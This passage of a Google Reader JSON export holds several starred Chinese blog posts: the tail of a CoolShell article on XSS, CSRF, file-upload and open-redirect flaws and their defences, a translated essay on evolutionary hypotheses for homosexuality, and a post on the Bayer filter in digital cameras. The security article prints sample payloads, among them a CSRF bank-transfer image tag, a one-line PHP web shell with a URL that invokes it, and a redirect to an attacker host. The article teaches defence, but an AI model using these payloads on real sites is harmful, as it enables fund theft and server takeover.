0020\\u002F\\u003E</div>\n<div>\\u003C\\u0069\\u006E\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003D</div>\n<div>\\u0022\\u0073\\u0075\\u0062\\u006D\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006C</div>\n<div>\\u0075\\u0065\\u003D\\u0022\\u004C\\u006F\\u0067\\u0069\\u006E\\u0022\\u0020\\u002F</div>\n<div>\\u003E\\u003C\\u002F\\u0066\\u006F\\u0072\\u006D\\u003E\\u003C\\u002F\\u0064\\u0069\\u0076\\u003E\\u000D’);&lt;/script&gt;</div>\n</div>\n<p><strong>XSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）</strong>。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《<a title=\"新浪微博的XSS攻击\" href=\"http://coolshell.cn/articles/4914.html\">新浪微博的XSS攻击</a>》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《<a href=\"http://www.cnblogs.com/kingthy/archive/2011/08/20/2147355.html\">腾讯微博的XSS攻击</a>》。</p>\n<p>XSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。</p>\n<p>不要以为XSS攻击是我们的程序没有写好，有时候，我们会引用别人站点上的js文件，比如：放一个天气预报的小Widget的js，或是一个流量监控，或是一段广告的js文件。你不知道这些东西是不是有问题，如果有恶意的话，这就是你自己主动注入攻击代码了。</p>\n<p><strong>另外，XSS攻击有一部分是和浏览器有关的。</strong>比如，如下的一些例子，你可能从来都没有想过吧？（<strong>更多的例子可以参看酷壳很早以前的这篇文章《<a href=\"http://coolshell.cn/articles/2416.html\">浏览器HTML安全列表</a>》</strong>）</p>\n<pre>&lt;table background=”javascript:alert(1)”&gt;\n\n&lt;meta charset=”mac-farsi”&gt;¼script¾alert(1)¼/script¾\n\n&lt;img src=”javascript:alert(1)”&gt;</pre>\n<p>XSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）</p>\n<p>于是，如果我在A站点内的某个贴子内注入这么一段代码：</p>\n<pre>&lt;img src=&quot;http://bank.example.com/transfer?account=XXX&amp;amount=1000000&amp;for=haoel&quot;&gt;</pre>\n<p>很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。</p>\n<p><strong>如何避免</strong></p>\n<p>要防止XSS攻击，一般来说有下面几种手段：</p>\n<ul>\n<li>严格限制用户的输入。最好不要让用户输入带标签的内容。最好不要让用户使用一些所见即所得的HTML编辑器。</li>\n</ul>\n<ul>\n<li>严格过滤用户的输入。如：\n<ul>\n<li>PHP的<code>htmlentities()或是htmlspecialchars()或是strip_tags()</code>。</li>\n<li>Python的<code>cgi.escape()</code></li>\n<li>ASP的<code>Server.HTMLEncode()</code>。</li>\n<li>Node.js的node-validator。</li>\n<li>Java的<a href=\"http://code.google.com/p/xssprotect/\" rel=\"nofollow\">xssprotect</a>。</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>在一些关键功能，完全不能信任cookie，必需要用户输入口令。如：修改口令，支付，修改电子邮件，查看用户的敏感信息等等。</li>\n</ul>\n<ul>\n<li>限制cookie的过期时间。</li>\n</ul>\n<ul>\n<li>对于CSRF攻击，一是需要检查http的reference header。二是不要使用GET方法来改变数据，三是对于要提交的表单，后台动态生成一个随机的token，这个token是攻击者很难伪造的。（对于token的生成，建议找一些成熟的lib库）</li>\n</ul>\n<p>另外，你可能觉得网站在处理用户的表单提交就行了，其实不是，<strong>想一想那些Web Mail，我可以通过别的服务器向被攻击用户发送有JS代码、图片、Flash的邮件到你的邮箱，你打开一看，你就中招了</strong>。所以，WebMail一般都禁止显示图片和附件，这些都很危险，只有你完全了解来源的情况下才能打开。<strong>电子邮件的SMTP协议太差了，基本上无法校验其它邮件服务器的可信度，我甚至可以自己建一个本机的邮件服务器，想用谁的邮件地址发信就用谁的邮件地址发信</strong>。<span style=\"color:#cc0000\"><strong>所以，我再次真诚地告诉大家，请用gmail邮箱</strong></span>。别再跟我说什么QQMail之类的好用了。</p>\n<h4>上传文件</h4>\n<p>上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。<strong>试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。</strong></p>\n<p>举个例子：</p>\n<pre>&lt;form action=&quot;upload_picture.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;\n要上传的文件:\n&lt;input type=&quot;file&quot; name=&quot;filename&quot;/&gt;\n&lt;br/&gt;\n&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt;\n&lt;/form&gt;\n</pre>\n<p> </p>\n<pre>$target = &quot;pictures/&quot; . basename($_FILES[&#39;uploadedfile&#39;][&#39;name&#39;]);\nif(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target)){\n    echo &quot;图片文件上传成功&quot;;\n}else{&lt;/div&gt;\n    echo &quot;图片文件上传失败&quot;;\n}</pre>\n<p>假如我上传了一个PHP文件如下：</p>\n<pre>&lt;?php\nsystem($_GET[&#39;cmd&#39;]);\n?&gt;</pre>\n<p>那么，我就可以通过如下的URL访问攻击你的网站了：</p>\n<pre>http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</pre>\n<p>抵御这样的攻击有两种手段：</p>\n<p>1）限制上传文件的文件扩展名。</p>\n<p>2）千万不要使用root或Administrator来运行你的Web应用。</p>\n<h4>URL跳转</h4>\n<p>URL跳转很有可能会成为攻击利用的工具。</p>\n<p>比如下面的PHP代码：</p>\n<pre>$redirect_url = $_GET[&#39;url&#39;];\nheader(&quot;Location: &quot; . $redirect_url);</pre>\n<p>这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。</p>\n<p>于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。</p>\n<pre>http://bank.example.com/redirect?url=http://attacker.example.net</pre>\n<p>这种攻击具有的迷惑性在于，用户看到的http://bank.example.com，<strong>以为是一个合法网站，于是就点了这个链接，结果通过这个合法网站，把用户带到了一个恶意网站，而这个恶意网站上可能把页面做得跟这个合法网站一模一样，你还以为访问的是正确的地方，结果就被钓鱼了</strong>。</p>\n<p>解决这个问题很简单，你需要在你的后台判断一下传过来的URL的域名是不是你自己的域名。</p>\n<p>你可以看看Google和Baidu搜索引擎的链接跳转，百度的跳转链接是被加密过的，而Google的网站链接很长，里面有网站的明文，但是会有几个加密过的参数，如果你把那些参数移除掉，Google会显示一个重定向的提醒页面。（我个人觉得还是Google做得好）</p>\n<p>（本篇文章结束）</p>\n<p>这段时间工作和家里的事比较多，所以时间有限，更新不快，而此篇行文比较仓促，欢迎大家补充，并指出我文中的问题。\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2012年11月22日 -- <a href=\"http://coolshell.cn/articles/8638.html\">为什么不能用微信或米聊这类的软件</a></li><li>2012年07月19日 -- <a href=\"http://coolshell.cn/articles/7917.html\">各式各样的验证码</a></li><li>2012年06月20日 -- <a href=\"http://coolshell.cn/articles/7490.html\">性能调优攻略</a></li><li>2011年08月25日 -- <a href=\"http://coolshell.cn/articles/5353.html\">你会做Web上的用户登录功能吗？</a></li><li>2011年11月28日 -- <a href=\"http://coolshell.cn/articles/5987.html\">如何设计“找回用户帐号”功能</a></li><li>2012年08月27日 -- <a href=\"http://coolshell.cn/articles/8170.html\">一次Ajax查错的经历</a></li><li>2012年05月15日 -- <a href=\"http://coolshell.cn/articles/7270.html\">NoSQL 数据建模技术</a></li><li>2009年12月15日 -- <a href=\"http://coolshell.cn/articles/1957.html\">Web程序的最佳测试数据</a></li></ul><div><a rel=\"nofollow\" href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1354873460605",
    "timestampUsec" : "1354873460605260",
    "id" : "tag:google.com,2005:reader/item/ed2942f14adf4a85",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "同性恋的起源是什么？",
    "published" : 1354873460,
    "updated" : 1354873460,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/403407/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>（文／大卫•巴拉什）有人批评说，演化生物学顶多算是猜想，但事实恰好相反。解剖学、生理学、胚胎学和行为学中许多难以解释的现象，演化学家们已经给出了明确的答案。然而，还是有一些谜题无法解开，其中最突出的一个便是同性恋的演化过程。这个问题本身并不复杂，但我们最出色的科学家们仍没有找到答案。</p>\n<p>任何一种性状得以演化的必要条件就是，该性状与繁殖成功是正相关的，更确切地说，该性状应当有利于相关基因在未来的延续。因此，如果同性恋是演化的产物——很显然它是，原因下面会解释——那么与偏好同性相关的遗传因素一定要在繁殖上具有某种优势。这样一来问题就很明显了：既然同性恋者比异性恋者繁殖的后代少，那为什么自然选择没有将同性恋这一性状淘汰掉呢？</p>\n<p>这个悖论对那些完全没有异性恋倾向的绝对同性恋者而言尤为突出。不过，就算是对双性恋者而言，这个问题依旧存在，因为繁殖结果哪怕只有毫厘之差，也会使潜在的演化进程发生巨大的变化，这在数学上是可以证明的。</p>\n<p>演化理论的巨擘之一霍尔丹（J.B.S. Haldane），曾做过这样的计算：假设有一对等位基因，其中常见的那个最初在人群中 99.9% 的人身上都能找到，而另一个罕见的则只有 0.1% 的人口携带。如果这种罕见基因具有 1% 的繁殖优势（每一代能产出 101 个后代，而常见基因每代只能产出 100 个），那么仅需要 4000 代的时间（从演化角度看只是一眨眼），局面就将发生逆转，最初的罕见基因会占据 99.9% 的基因池。这就是所谓“利滚利”的力量，通过自然选择发挥作用。</p>\n<p>对我们而言，这其中颇有深意：任何有损基因繁殖能力的性状，哪怕程度轻微，（从演化的角度讲）都会遭到残酷的淘汰。而同性恋看起来正像是其中的一个。男同性恋者有孩子的几率大约是异性恋者的 20%。我还没有见到女同性恋这方面的可靠数据，但看来很可能存在着类似的模式。而且，双性恋者繁殖出的后代数量，应该也比异性恋者要少，因为异性恋者把自己的恋爱时间和精力都倾注到了异性身上。</p>\n<div>\n<h1>同性恋的遗传基础</h1>\n<p>在不同文化中，同性恋者在人口中所占的比例是差不多一致的。是什么保持了这一性状的遗传倾向呢？</p>\n<p>说同性恋是后天“习得”的也不能用以解释这个现象（※此处已更改）。科学界普遍认为，同性恋是有生理基础的。一方面，许多野生动物都有同性性行为。更重要的是，同性恋在智人（ <em>Homo Sapiens</em> ）中持续地、高比例地、跨文化地存在。</p>\n<p>20世纪90年代初，美国国家卫生研究所（NIH）的一个遗传学研究小组发现，位于 X 染色体上的等位基因 Xq28 能够预测男性的性取向。大部分同性恋权益倡导者相当看好这一研究，而主张性取向完全是个人生活方式选择的那些人则对可能的研究结果颇为畏惧；然而后续研究则一直没有得出明确的结论。情况比大家想象的要复杂得多。</p>\n<p>一些研究未能证实 Xq28 对性取向有任何决定作用，而另一些则对原始研究表示支持。而且越来越清楚的是，无论 Xq28 对男同性恋者影响如何，这一基因与女性的性取向无关。此外，其他研究表明，常染色体上的一些区域也会影响人的性取向。</p>\n<p>综上所述，我们可以得出一个合理的总结，几乎可以肯定男同性恋性状的出现是受到了基因的直接影响，虽然或许并不是由一个或多个等位基因严格控制的。女同性恋性状也是如此，只是其涉及的遗传机制和相关基因都与男同性恋不同。</p>\n<p>将性取向和具体的 DNA 对应起来的研究很有启发性，但一直没有得出确定的结论。除此之外，还出现了其他的遗传学证据。针对兄弟姐妹和双胞胎的大量研究数据表明，基因在性取向中所扮演的角色非常复杂，我们尚不能完全理解，但其作用是真实存在的。值得注意的是，同性恋一致性在领养的兄弟姐妹（因此基因上没有关联）间要比在亲生兄弟姐妹间低，而亲生兄弟姐妹间的同性恋一致性又比异卵双胞胎的要低，异卵双胞胎的则比同卵双胞胎的低。</p>\n<p>这些研究结果还进一步证明了，遗传因素对性取向的影响是男女有别的。其他的研究则证实了同性恋倾向，无论男女，相当程度上是遗传的。</p>\n</div>\n<div>\n<h1>同性恋起源的若干假说</h1>\n<p>难以否认，我们面对着一个演化之谜：同性恋的潜在基因倾向究竟为什么能延续下来？我们仍没有找到答案。不过演化学者提出几个非常有潜力的假说：</p>\n<p><strong>亲缘选择假说。</strong> 科学家们推测，产生利他主义的基因帮助了有遗传关系的亲属，从而使后者的利他基因具有了遗传优势，利他主义便得以延续。同样的道理也可能适用于同性恋：同性恋个体不用在其自身的繁殖上投入时间和精力，或许他们就能够帮助亲戚养育后代，而最终使这些孩子身上潜在的同性恋倾向基因在演化中受益。</p>\n<p>不幸的是，目前尚没有证据表明同性恋者花了特别大量的时间帮助亲属养育后代，甚至看不出他们和家人互动的时间比其他人多。不过也不要急于下结论：这些结果是基于问卷调查得出的；它们反映的是观点态度而非实际的行为。再者，调查面对的是现代化的工业社会，大概不能代表人类祖先的情况。</p>\n<p>最近的一项研究以南太平洋萨摩亚群岛的男同性恋者为对象进行了调查。萨摩亚是一个更加传统的社会，当地的男同性恋者被称为 “Fa'afafine”， 不生育后代，完全能被社会全体接受，尤其被他们的血亲家庭所接受。这些男同性恋者对侄（外甥）辈倾注了大量的精力——这些孩子与他们平均有 25% 的基因是相同的。</p>\n<p><strong>社会声誉假说。</strong> 有人类学证据表明，在工业化之前的社会，同性恋男性更有可能成为牧师或者祭司，他们的异性恋亲属也因此获得了较高的社会声誉，并因此占有繁殖优势，从而使得任何共有的同性恋倾向基因得到延续。这是一个非常有吸引力的想法，不过也缺乏实证支持。</p>\n<p><strong>群体选择假说。</strong> 大部分生物学家都认为自然选择发生在个体及其基因的层面，而非发生于群体之中。但人类可能是一个例外；或许包含有同性恋个体的群体比全部是异性恋个体的群体更好。最近，人类学家莎拉•赫迪（Sarah B. Hrdy）等人指出，在人类演化史的大部分时期，养育后代不都是父母的（更不是母亲的）专利，我们的祖先有很多拟母亲行为（allomothering），那些并非孩子双亲的人，尤其是其他的血缘亲属，参与到了抚养后代的任务中。智人发展出这样一套体系是很有道理的，因为在所有的灵长目动物中，智人的新生儿是最无助的，需要成人投入的精力也最多。如果种群中有足够多育儿帮手是同性恋者，整个群体都将从中极大地受益。</p>\n<p>另一方面，就算人类祖先中的同性恋者并不一定要参与到合作抚养后代的任务中去，他们较少生育（或者干脆就不生），这本身就为其异性恋亲属节省了更多的资源。还有研究者提出了其他群体层面上的模型，关注社交互动而不是资源利用：同性恋也许与更强的社交性和社会合作有关；它还可能阻止为争夺异性而产生的暴力竞争。</p>\n<p><strong>平衡多态假说。</strong> 或许同性恋这种遗传倾向与某种或者某几种特定的基因共同起作用时，会因为某种未知的原因而产生补偿性的益处，比如著名的镰刀形红细胞贫血症（sickle-cell disease ※此处已更改），这种病的致病基因有助于预防疟疾。虽然目前还没有确定哪一段基因是决定性取向的，但我们仍旧不能排除这种平衡多态的可能性。</p>\n<p><strong>性别对抗选择假说。</strong> 万一某种性别个体的一个或多个同性恋基因（导致繁殖后代减少），在另一种性别个体的身上会起到相反的效果呢？ 我更喜欢“性别<strong>互补</strong>选择”（sexually complementary selection）这种说法：在一个性别——比如男同性恋中损害生存适应性的基因，在女性身上可能就具有增强适应性的作用。</p>\n<p>一项研究发现，男同性恋者的女性亲属比男异性恋者的女性亲属会生育更多的后代。这表明同性恋基因虽然对男同性恋者及其男性亲属不利，但对其异性恋女性亲属来说却是一项繁殖优势。</p>\n<p>就我所知，目前还没有发现相反情况，女同性恋者的男性亲属并没有更强高的繁殖适应性。这种情况可能永远都不会出现，因为越来越多的证据表明女同性恋和男同性恋的遗传方式并不相同。</p>\n<p><strong>非适应性的副产物。</strong> 同性恋行为可能既不是适应性的，也不是不适应的，它可能就是一种非适应性的行为。也就是说，它也许并没有得到自然选择，而是作为某些优势性状的副产物被保留了下来。这样的优势性状可能是渴望形成配对关系、寻求感情或者生理上的满足，等等。那么，为什么会存在这样的倾向，为什么人与人之间的亲密关系是愉悦的？ 答案很有可能是，在演化进程中，长期的配对关系最有利于个体的成功繁殖。</p>\n</div>\n<div>\n<h1>为什么要研究同性恋</h1>\n<p>关于同性恋的演化谜题还有很多其他的假说，但并不是无穷无尽，并不是任何一个假说都能自圆其说。以我们现在掌握的知识，只能够确定：同性恋是有生理基础的，但其生理机制的演化过程仍是一个不解之谜。</p>\n<p>另外一个问题是，我们为什么要费心研究同性恋的演化过程。</p>\n<p>雷•布拉德伯利（Ray Bradbury）在《火星编年史》（The Martian Chronicles）一书的末尾，描述了令人不寒而栗的一幕：一个人类家庭为了躲避地球上即将爆发的核战争而逃难到了火星，他们急切地朝新家园表面的“运河”看去，期待见到火星人。他们确实看到了火星人：他们自己的倒影。</p>\n<p>不是很久之前，有声望的天文学家还认真考虑过火星上有运河的事情。目前看来，这显然是天方夜谭。然而，在一些重要方面，人类仍然不了解自身，甚至在看见自己的“倒影”时感到惊讶。就像布拉德伯利虚构的那家人一样，我们也可以从神奇的多样性中了解人性的本质，如果我们看得足够认真，一定能把自己看得清清楚楚。</p>\n<p>对同性恋的问题，美国军方过去奉行“不问不说”的政策。与之不同的是，许多著名的研究者并不在乎 <strong>“谁”</strong> 是同性恋，而是要问 <strong>“为什么”</strong> 会存在同性恋。我们可以相信，最终，自然会揭示这一答案。</p>\n<div>\n<div><br></div>\n</div>\n<p><strong>更正说明：</strong> 文章发布之初，在“平衡多态假说”一段，误将 sickle-cell disease 译作地中海贫血症，其实应为镰刀形红细胞贫血症。经读者 <a href=\"http://www.guokr.com/i/0124759594/\">@江南草</a> 指出后更改，特此说明。（2012-12-7）</p>\n<p>在“同性恋的遗传基础”一节中，第二自然段第一句最初译作“同性恋并不是后天‘习得’的”，这样处理有失妥当，引发了误会。现在我们根据英文原文对译文进行了更正，特此说明。（2012-12-11）</p>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译自:</th><td>《高等教育纪事报》 <strong>The Evolutionary Mystery of Homosexuality</strong></td>\n</tr>\n<tr><th>作者简介:</th><td>大卫•巴拉什（David P. Barash），演化生物学家，华盛顿大学心理学教授。他最新的著作《智人之谜：人性的进化拼图》（Homo Mysterious: Evolutionary Puzzles of Human Nature）已由牛津大学出版社于2012年出版。</td>\n</tr>\n<tr><th>文章图片:</th><td>chronicle.com</td>\n</tr>\n<tr><th>本文编辑:</th><td><a href=\"http://www.guokr.com/i/1220728961/\">熊出没</a></td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>"
    },
    "author" : "勤劳的小笼包",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1354780338315",
    "timestampUsec" : "1354780338315453",
    "id" : "tag:google.com,2005:reader/item/7da63a9e3c59837b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "为什么数码相机可以拍出彩色照片？",
    "published" : 1354778699,
    "updated" : 1354778699,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/12/bayer_filter.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>上个月（11月13日），83岁的柯达公司退休工程师<a href=\"http://www.nytimes.com/2012/11/29/business/bryce-bayer-inventor-of-a-filter-to-make-color-digital-pictures-dies-at-83.html\">布赖斯·拜尔</a>（Bryce Bayer）去世。</p><p><img src=\"http://image.beekka.com/blog/201212/bg2012120600.jpg\"></p>\n\n<p>一家国内<a href=\"http://magazine.caixin.com/\">杂志</a>邀请我写纪念文章，回顾他对数码摄影的巨大贡献。</p>\n\n<p>我看了一些材料，觉得这个题材很有意思，涉及数码相机的成像原理，使我对数字图像技术有了新的认识。但是，由于体例限制，杂志不允许我插入彩图。</p>\n\n<p>下面，我把我的那篇文章配上图片，解释彩色数码照片是怎么拍出来的。</p>\n\n<p>1.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120601.jpg\"></p>\n\n<p>为了更好地理解原理，让我们从照片的起源讲起。1825年，法国人<a href=\"http://zh.wikipedia.org/wiki/%E7%B4%84%E7%91%9F%E5%A4%AB%C2%B7%E5%B0%BC%E5%A1%9E%E7%A6%8F%E7%88%BE%C2%B7%E6%B6%85%E6%99%AE%E6%96%AF\">涅普斯</a>（Joseph Nicéphore Nièpce），拍出历史上第一张照片。</p>\n\n<p>2.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120602.jpg\"></p>\n\n<p>他采用的感光剂是<a href=\"http://zh.wikipedia.org/wiki/%E6%B0%AF%E5%8C%96%E9%93%B6\">氯化银</a>（silver chloride）。当光线照射氯化银，后者会分解成纯银和氯气，银金属颗粒呈现黑色。因此，底片颜色越深代表光线越强，颜色越浅代表光线越弱。黑白照片就是这样拍出来。</p>\n\n<p>3.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120603.gif\"></p>\n\n<p>19世纪中期，人们发现，人眼的圆锥细胞对三种颜色----红、绿、蓝----特别敏感。伟大的英国物理学家麦克斯韦因此假设，红绿蓝作为基色，可以拍出彩色照片。</p>\n\n<p>4.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120604.jpg\"></p>\n\n<p>1861年，在麦克斯韦的指导下，人类的第一张彩色照片诞生了。</p>\n\n<p>采用的方法是在镜头前，分别用红丝带、绿丝带、蓝丝带过滤光线，曝光形成三张底片，然后用三部放映机向同一处投影这三张底片，每部放映机的镜头前都拧上对应颜色的镜头，它们的合成效果就是一张彩照。</p>\n\n<p>5.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120605.png\"></p>\n\n<p>真正意义上的彩色胶卷，1933年诞生于柯达公司，底片之上依次有三个感光层，分别对红、绿、蓝三种颜色进行曝光，最后叠加形成一张彩色底片。</p>\n\n<p>6.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120606.jpg\"></p>\n\n<p>二战后，计算机诞生，科学家发现图像可以用数字形式表示。如果将光信号转变成电信号，就可以直接拍出数码照片。这意味着，照相机不再需要胶卷，而是需要一个<a href=\"http://en.wikipedia.org/wiki/Image_sensor\">图像传感器</a>（image sensor）。</p>\n\n<p>7.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120607.png\"></p>\n\n<p>图像传感器将光线转化成电流，光线越亮，电流的数值就越大；光线越暗，电流的数值就越小。所以，如果用0到255的范围，表示光线的亮度，最亮的光线是白光，数值是十六进制的FF，最暗的光线是黑光（没有光），数值是十六进制的00。</p>\n\n<p>8.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120608.png\"></p>\n\n<p>图像传感器的表面，分成若干个捕捉点，每个点都会产生一个数值，表示该点感受到的光线亮度，这就叫做\"像素\"。像素越多，图像细节就越丰富。如果一台相机的像素是1600x1200，就说明图像传感器横向有1600个捕捉点，纵向有1200个，合计192万个。</p>\n\n<p>9.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120609.png\"></p>\n\n<p>但是，图像传感器有一个很严重的缺陷：它只能感受光的强弱，无法感受光的波长。由于光的颜色由波长决定，所以图像传播器无法记录颜色，也就是说，它只能拍黑白照片，这肯定是不能接受的。</p>\n\n<p>10.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120610.png\"></p>\n\n<p>一种解决方案是照相机内置三个图像传感器，分别记录红、绿、蓝三种颜色，然后再将这三个值合并。这种方法能产生最准确的颜色信息，但是成本太高，无法投入实用。</p>\n\n<p>11.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120611.png\"></p>\n\n<p>1974年，柯达公司的工程师布赖斯·拜尔提出了一个全新方案，只用一块图像传感器，就解决了颜色的识别。他的做法是在图像传感器前面，设置一个<a href=\"http://en.wikipedia.org/wiki/Color_filter_array\">滤光层</a>（Color filter array），上面布满了滤光点，与下层的像素一一对应。也就是说，如果传感器是1600x1200像素，那么它的上层就有1600x1200个滤光点。</p>\n\n<p>12.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120612.png\"></p>\n\n<p>每个滤光点只能通过红、绿、蓝之中的一种颜色，这意味着在它下层的像素点只可能有四种颜色：红、绿、蓝、黑（表示没有任何光通过）。</p>\n\n<p>13.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120613.png\"></p>\n\n<p>不同颜色的滤光点的排列是有规律的：每个绿点的四周，分布着2个红点、2个蓝点、4个绿点。这意味着，整体上，绿点的数量是其他两种颜色点的两倍。这是因为研究显示人眼对绿色最敏感，所以滤光层的绿点最多。</p>\n\n<p>14.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120614.png\"></p>\n\n<p>接下来的问题就是，如果一个像素只可能有四种颜色，那么怎么能拍出彩色照片呢？这就是布赖斯·拜尔聪明的地方，前面说了，每个滤光点周围有规律地分布其他颜色的滤光点，那么就有可能结合它们的值，判断出光线本来的颜色。以黄光为例，它由红光和绿光混合而成，那么通过滤光层以后，红点和绿点下面的像素都会有值，但是蓝点下面的像素没有值，因此看一个像素周围的颜色分布----有红色和绿色，但是没有蓝色----就可以推测出来这个像素点的本来颜色应该是黄色。</p>\n\n<p>15.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120615.jpg\"></p>\n\n<p>这种计算颜色的方法，就叫做<a href=\"http://en.wikipedia.org/wiki/Demosaicing\">\"去马赛克\"</a>（demosaicing）。上图的下半部分是图像传感器生成的\"马赛克\"图像，所有的像素只有红、绿、蓝、黑四种颜色；上半部分是\"去马赛克\"后的效果，这是用算法处理的结果。</p>\n\n<p>16.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012120616.png\"></p>\n\n<p>虽然，每个像素的颜色都是算出来的，并不是真正的值，但是由于计算的结果相当准确，因此这种做法得到广泛应用。目前，绝大部分的数码相机都采用它，来生成彩色数码照片。高级的数码相机，还提供未经算法处理的原始马赛克图像，这就是<a href=\"http://en.wikipedia.org/wiki/Raw_image_format\">raw格式</a>（raw image format）。</p>\n\n<p>为了纪念发明者布赖斯·拜尔，它被称作\"拜尔模式\"或<a href=\"http://en.wikipedia.org/wiki/Bayer_filter\">\"拜尔滤光法\"</a> （Bayer filter）。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/12/bayer_filter.html\">http://www.ruanyifeng.com/blog/2012/12/bayer_filter.html</a></li>\n<li>最后修改时间：2013年1月 4日 03:10</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1354084129326",
    "timestampUsec" : "1354084129326735",
    "id" : "tag:google.com,2005:reader/item/bac9da462d308326",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "程序设计", "编程语言", "Go", "golang" ],
